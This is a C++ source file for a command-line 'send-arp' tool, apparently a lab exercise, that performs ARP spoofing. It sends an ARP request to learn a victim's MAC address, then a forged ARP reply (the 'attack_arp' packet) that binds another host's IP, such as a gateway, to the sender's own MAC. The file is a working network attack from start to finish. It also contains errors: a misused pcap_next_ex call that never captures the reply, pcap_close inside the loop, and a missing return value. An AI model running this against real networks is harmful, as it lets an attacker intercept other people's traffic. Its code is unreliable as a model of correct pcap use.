#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_ALEN 6
#define MAC_ADDR_FMT "%02x:%02x:%02x:%02x:%02x:%02x"
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}
uint8_t mac_addr[MAC_ALEN];
int GetInterfaceMacAddress(const char *ifname, uint8_t *mac_addr)
{
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd<0) {
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return -1;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
    close(sockfd);
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    const char *ifname = argv[1];

    if(GetInterfaceMacAddress(ifname, mac_addr)==-1) return -1;

	for(int i=1;i<argc/2;i++){
		
		EthArpPacket request_arp, reply_arp, attack_arp;
		request_arp.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		request_arp.eth_.smac_ = Mac(mac_addr);
		request_arp.eth_.type_ = htons(EthHdr::Arp);

		request_arp.arp_.hrd_ = htons(ArpHdr::ETHER);
		request_arp.arp_.pro_ = htons(EthHdr::Ip4);
		request_arp.arp_.hln_ = Mac::SIZE;
		request_arp.arp_.pln_ = Ip::SIZE;
		request_arp.arp_.op_ = htons(ArpHdr::Request);
		request_arp.arp_.smac_ = Mac(mac_addr);
		request_arp.arp_.sip_ = htonl(Ip(argv[i*2+1]));
		request_arp.arp_.tmac_ = Mac("00:00:00:00:00:00");
		request_arp.arp_.tip_ = htonl(Ip(argv[i*2]));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_arp), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		res = pcap_next_ex(handle, reinterpret_cast<pcap_pkthdr**>(&reply_arp), reinterpret_cast<const u_char**>(&reply_arp));
		if (res != 1) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		attack_arp.eth_.dmac_ = reply_arp.eth_.smac_;
		attack_arp.eth_.smac_ = Mac(mac_addr);
		attack_arp.eth_.type_ = htons(EthHdr::Arp);

		attack_arp.arp_.hrd_ = htons(ArpHdr::ETHER);
		attack_arp.arp_.pro_ = htons(EthHdr::Ip4);
		attack_arp.arp_.hln_ = Mac::SIZE;
		attack_arp.arp_.pln_ = Ip::SIZE;
		attack_arp.arp_.op_ = htons(ArpHdr::Reply);
		attack_arp.arp_.smac_ = Mac(mac_addr);
		attack_arp.arp_.sip_ = htonl(Ip(argv[i*2+1]));
		attack_arp.arp_.tmac_ = reply_arp.arp_.smac_;
		attack_arp.arp_.tip_ = htonl(Ip(argv[i*2]));

		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_arp), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		pcap_close(handle);
	}
}
